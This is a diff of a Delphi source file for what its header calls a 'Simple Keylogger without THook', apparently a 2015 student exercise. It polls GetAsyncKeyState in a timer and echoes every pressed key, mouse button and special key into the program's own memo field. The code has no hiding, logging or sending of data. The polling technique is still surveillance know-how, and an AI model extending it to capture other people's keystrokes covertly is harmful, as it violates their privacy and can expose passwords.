@@ -1,11 +1,11 @@
 unit Unit1;
-(******************************************************)
-(*                                                    *)
-(*    Simple Keylogger without hook (Single values)   *)
-(*        Timothy Schiess                             *)
-(*       19.02.2015                                   *)
-(*                                                    *)
-(******************************************************)
+
+{
+   Description: Simple Keylogger without THook
+   Authors: Timothy Schiess, Florian Huwyler, Alain Stulz
+   Date: 19.02.2015 - 26.02.2015
+}
+
 interface
 
 uses
@@ -40,16 +40,111 @@ end;
 
 procedure TForm1.Button1Click(Sender: TObject); // Clears all memos
 begin
-Memo1.text := '';
-Memo2.Text := '';
+  Memo1.text := '';
+  Memo2.Text := '';
+  Memo2.SetFocus;
 end;
 
 procedure TForm1.Timer1Timer(Sender: TObject);
 var
 InputKey, KeyResult : Integer;
 begin
+
 InputKey := 0;
 repeat
+KeyResult := GetAsyncKeyState(InputKey);
+if KeyResult = -32767 then
+begin
+  case InputKey of
+    1: DisplayAction(' [MOUSE LEFT] ');
+    2: DisplayAction(' [MOUSE RIGHT] ');
+    4: DisplayAction(' [MOUSE WHEEL CLICK] ');
+    8: DisplayAction(' [BACKSPACE] ');
+    9: DisplayAction(' [TAB] ');
+    12: DisplayAction(' [ALT] ');
+    13: DisplayAction(' [ENTER] ');
+    16: DisplayAction(' [SHIFT] ');
+    17: DisplayAction(' [CONTROL] ');
+    18: DisplayAction(' [ALT] ');
+    19: DisplayAction(' [BREAK] ');
+    20: DisplayAction(' [CAPS LOCK] ');
+    27: DisplayAction(' [ESC] ');
+    32: DisplayAction(' [SPACE] ');
+    33: DisplayAction(' [PAGE UP] ');
+    34: DisplayAction(' [PAGE DN] ');
+    35: DisplayAction(' [END] ');
+    36: DisplayAction(' [HOME] ');
+    37: DisplayAction(' [LEFT ARROW] ');
+    38: DisplayAction(' [UP ARROW] ');
+    39: DisplayAction(' [RIGHT ARROW] ');
+    40: DisplayAction(' [DOWN ARROW] ');
+    44: DisplayAction(' [PRINT SCREEN] ');
+    45: DisplayAction(' [INSERT] ');
+    46: DisplayAction(' [DELETE] ');
+    96: DisplayAction(' 0 ');
+    97: DisplayAction(' 1 ');
+    98: DisplayAction(' 2 ');
+    99: DisplayAction(' 3 ');
+    100: DisplayAction(' 4 ');
+    101: DisplayAction(' 5 ');
+    102: DisplayAction(' 6 ');
+    103: DisplayAction(' 7  ');
+    104: DisplayAction(' 8 ');
+    105: DisplayAction(' 9 ');
+    106: DisplayAction(' * ');
+    107: DisplayAction(' + ');
+    109: DisplayAction(' - ');
+    110: DisplayAction(' . ');
+    111: DisplayAction(' / ');
+    112: DisplayAction(' [F1] ');
+    113: DisplayAction(' [F2] ');
+    114: DisplayAction(' [F3] ');
+    115: DisplayAction(' [F4] ');
+    116: DisplayAction(' [F5] ');
+    117: DisplayAction(' [F6] ');
+    118: DisplayAction(' [F7] ');
+    119: DisplayAction(' [F8] ');
+    120: DisplayAction(' [F9] ');
+    121: DisplayAction(' [F10] ');
+    122: DisplayAction(' [F11] ');
+    123: DisplayAction(' [F12] ');
+    144: DisplayAction(' [NUM LOCK] ');
+    145: DisplayAction(' [SCROLL LOCK] ');
+    160: ; // Shift Left
+    161: ; // Shift Right
+    162: ; // Control Left
+    163: ; // Control Right
+    164: ; // Alt Left
+    165: ; // Alt Right
+    186: DisplayAction(' ü ');
+    187: DisplayAction(' = ');
+    188: DisplayAction(' , ');
+    189: DisplayAction(' - ');
+    190: DisplayAction(' . ');
+    191: DisplayAction(' § ');
+    192: DisplayAction(' ¨ ');
+    193: DisplayAction(' / ');
+    219: DisplayAction(' ´ ');
+    220: DisplayAction(' ä ');
+    221: DisplayAction(' ^ ');
+    222: DisplayAction(' ö ');
+    223: DisplayAction(' $ ');
+    226: DisplayAction(' < ');
+  else if (InputKey >=32) and (InputKey <=110) AND (InputKey <> 64) then
+  begin
+    Memo1.Text := Memo1.Text + Chr(InputKey) + ' TAG: ' + IntToStr(InputKey);
+    Memo1.Lines.Add('');
+  end
+  else // Exception for all undefined keys
+    Memo1.Lines.Add(IntToStr(InputKey));
+  end; {of ELSE}
+  end; {of CASE}
+  Inc(InputKey);
+until InputKey = 255
+end;
+end.
+
+{repeat
   keyresult := GetAsyncKeyState(InputKey); // Reads when key is pressed
   if KeyResult = -32767 then // -32767: Key is pressed at the moment
   begin
@@ -88,7 +183,7 @@ repeat
     121: DisplayAction(' [F10] ');
     122: DisplayAction(' [F11] ');
     123: DisplayAction(' [F12] ');
-    187: DisplayAct ion(' = ');
+    187: DisplayAction(' = ');
     188: DisplayAction(' , ');
     189: DisplayAction(' - ');
     190: DisplayAction(' . ');
